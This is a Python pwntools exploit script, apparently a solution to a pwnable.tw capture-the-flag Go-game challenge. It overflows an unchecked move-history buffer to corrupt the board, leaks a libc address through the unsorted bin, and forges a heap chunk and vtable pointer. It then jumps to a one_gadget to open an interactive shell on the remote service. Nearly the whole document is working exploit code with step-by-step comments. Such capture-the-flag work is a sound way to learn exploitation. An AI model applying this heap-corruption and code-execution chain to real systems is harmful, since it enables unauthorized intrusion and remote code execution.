from pwn import *

'''
encode_pos (2 bit){
    computer occupies
    player occupies
}

board
    |   4   |   4   |   4   |   4   |
0x00|           encode_pos          |
0x10|           encode_pos          |
0x20|           encode_pos          |
0x30|           encode_pos          |
0x40|           encode_pos          |
0x50|           encode_pos          |
0x60|Lmove_y|Lmove_x|  turn |   x   |
0x70|   timeComp    |   timePlayer  |

class Player{
    public:
        virtual void Play(...);
};

class Player : public Player(...)

class Computer : public Computer(...)
'''

###Utils
def translate_idx(x,y):
    target = x*32+y//2
    player = y%2
    x = target%19
    y = target//19
    if player==0:
        x = 18-x
        y = 18-y
    return (chr(ord('A')+x),19-y)

def makemove(x,y,mode='pos'):
    if mode=='pos':
        r.sendlineafter('Time',x+str(y))
    elif mode=='idx':
        (x,y) = translate_idx(x,y)
        r.sendlineafter('Time',x+str(y))

def surrender():
    r.sendlineafter('Time','surrender')

def regret():
    r.sendlineafter('Time','regret')

def restart():
    r.sendlineafter('(y/n)\n','n')
    r.sendlineafter('(y/n)\n','y')

def getboard():
    r.recvuntil('QRS\n')
    val = ''
    for i in range(19):
        val+=r.recvline().decode()[3:-1]
    return val

def interpret_board():
    translate = {'.':0,'O':1,'X':2,'\x00':3}
    board_state = getboard()
    val = [0 for i in range(12)]
    for i in range(0,361,32):
        for j in range(min(31,360-i),-1,-1):
            val[i//32]*=4
            val[i//32]+=translate[board_state[i+j]]
    return val

def make_ko():
    #'ko' is a tied situation where player play repeated moves over and over again
    #for mirror go, a simple 'ko' looks like this
    # XO     XO
    #XO O   X XO
    # XO     XO
    #by taking turns capturing pieces, the two players will waste moves, while not making any actual progress in game
    makemove('Q',18)
    makemove('P',17)
    makemove('R',17)
    makemove('Q',16)
    makemove('B',4)
    makemove('A',3)
    makemove('B',2)

def craft_chunk():
    #make 0x21 at board[3] and board[7]
    makemove(3,0,mode='idx')
    makemove(3,5,mode='idx')
    makemove(7,0,mode='idx')
    makemove(7,5,mode='idx')

def craft_vtable():
    #make 0x609440() at board[4](fake_chunk[0])
    makemove(4,6,mode='idx')
    makemove(4,10,mode='idx')
    makemove(4,12,mode='idx')
    makemove(4,15,mode='idx')
    makemove(4,21,mode='idx')
    makemove(4,22,mode='idx')

def flood_hist(mode='leak'):
    #The first move by computer
    cnt = 1
    #Create ko and assign restricted positions in case pieces forming the ko are captured
    make_ko()
    jmp_forwards = {('Q',18):6,('P',17):8,('Q',16):6}
    cnt+=14
    #Reserve positions needed for further usage and prevent board flooding from occupying those positions
    if mode=='leak':
        reserved = []
        pass
    elif mode=='chunk':
        reserved = [3,7]
        craft_chunk()
        cnt+=8
    elif mode=='vtable':
        reserved = [4]
        craft_vtable()
        cnt+=12
    orig_state = (cnt+2)%8
    #skip board[0], not neccesary, but helps stabilize the exploit
    idx = [10,16]
    #flood board, while following the restrictions placed earlier
    while cnt<365:
        print(cnt)
        makemove(idx[0],idx[1],mode='idx')
        cnt+=2
        if cnt>=365:
            break
        if cnt%8==orig_state:
            makemove('C',3)
        else:
            makemove('R',17)
        cnt+=2
        idx[1]-=2
        pos = translate_idx(idx[0],idx[1])
        if pos in jmp_forwards:
            idx[1]-=jmp_forwards[pos]
        if (11-idx[0]) in reserved and idx[1]==16:
            idx[0]-=1
        if idx[1]<0:
            idx[0]-=1
            idx[1]+=64
        if idx[0] in reserved:
            idx[0]-=1
            idx[1]=62

def getshell():
    r.sendlineafter('Time',b'A1__'+p64(libc_base+one_gadget)[:6])

###Addr
#  libc2.23
main_arena_offset = 0x3c3b20
unsorted_bin_offset = main_arena_offset+0x58
input_buf = 0x60943c
one_gadget = 0xf0567


###Exploit
#  The AI plays mirror go and at playing pieces, program will check if the move is legal
#  Otherwise, there aren't any other checks to current board state
#  Meaning if we somehow corrupt the state of the board, it is possible to slip by without being noticed
r = remote('chall.pwnable.tw',10405)

###Leak libc
#  Current board follows right after history records
#  History records does not have OOB check
#  Overflow the records to overwrite current board and leak information

#  at start of games,a new Player and Computer is created, and never deleted
#  those can be used to help align chunks for further operations
#  Create 2 useless games so that the chunk overlapping current_board will be aligned at 0xe30
for i in range(2):
    surrender()
    restart()

#  fill up the history and make last computer move overlap with current_board[0]
flood_hist(mode='leak')
#  edit current_board to make history[364] point to new_chunk = original_chunk+0x80
#  new_chunk[0] = NULL (important so that freeing history doesn't cause error)
#  new_chunk[8] = unsorted_bin (for leakage)
makemove(0,7,mode='idx')
#  forfeit last move, and the newchunk will be written back onto board
regret()
unsorted_bin_addr = interpret_board()[8]
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))

###Create fake chunk
#  Create 20 useless chunks so that the chunk overlapping current_board will be aligned at 0x400
#  Unstable here(sometimes, chunks fail to align due to unknown reason, about 50~75% success rate)
for i in range(20):
    surrender()
    restart()

#  fill up history and create fake chunk of size 0x20 to accomodate later Computer objects
flood_hist(mode='chunk')
a = interpret_board()
for i in a:
    print(hex(i))
#  edit current_board to make history[364] point to new_chunk = original_chunk+0x1a0 = fake_chunk
makemove(0,5,mode='idx')
makemove(0,7,mode='idx')
makemove(0,8,mode='idx')

###Free fake chunk and play one last time
surrender()
restart()

#  fill up history and create fake vtable pointer for Computer object
#  the fake pointer points to input_buf+0x4, where we will input our desired function in the next move
flood_hist(mode='vtable')

#  call one_gadget and get shell
getshell()

r.interactive()
